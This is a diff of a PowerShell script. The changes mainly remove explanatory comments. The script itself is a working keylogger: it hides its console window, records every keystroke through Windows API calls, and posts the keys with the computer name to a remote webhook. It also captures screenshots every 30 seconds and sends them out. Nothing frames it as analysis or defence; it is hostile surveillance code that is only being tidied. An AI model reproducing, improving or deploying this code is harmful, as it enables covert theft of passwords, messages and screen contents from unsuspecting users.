@@ -3,7 +3,7 @@ if ($dc.Ln -ne 121) {
     $dc = (irm $dc).url
 }
 
-$send = ""  # Inicialización de la variable $send
+$send = ""
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
@@ -18,7 +18,6 @@ else {
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
-# Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -32,26 +31,22 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# Add stopwatch for intelligent sending
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-$seconds = 30  # Screenshot interval
-$a = 1  # Screenshot amount
+$seconds = 30
+$a = 1
 
-# Start a continuous loop
 while ($true) {
     $keyPressed = $false
 
     try {
-        # Start a loop that checks the time since the last activity before a message is sent
         while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-            # Start the loop with a 30 ms delay between keystate checks
             Start-Sleep -Milliseconds 30
 
-            # Capture key presses
             for ($asc = 8; $asc -le 254; $asc++) {
                 $keyst = $API::GetAsyncKeyState($asc)
+
                 if ($keyst -eq -32767) {
                     $keyPressed = $true
                     $LastKeypressTime.Restart()
@@ -60,11 +55,14 @@ while ($true) {
                     $kbst = New-Object Byte[] 256
                     $checkkbst = $API::GetKeyboardState($kbst)
                     $logchar = New-Object -TypeName System.Text.StringBuilder
+
                     if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                         $LString = $logchar.ToString()
+
                         if ($asc -eq 8) { $LString = "[BKSP]" }
                         if ($asc -eq 13) { $LString = "[ENT]" }
                         if ($asc -eq 27) { $LString = "[ESC]" }
+
                         $send += $LString
                     }
                 }
@@ -73,19 +71,16 @@ while ($true) {
     }
     finally {
         If ($keyPressed) {
-            # Send the saved keys to a webhook
             $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
             $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
             $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
 
-            # Remove the log file and reset the inactivity check
             $send = ""
             $keyPressed = $false
         }
 
-        # Capture and send screenshot
         $Filett = "$env:temp\SC.png"
         Add-Type -AssemblyName System.Windows.Forms
         Add-type -AssemblyName System.Drawing
@@ -103,7 +98,6 @@ while ($true) {
         Remove-Item -Path $Filett
     }
 
-    # Reset the stopwatch before restarting the loop
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
 }
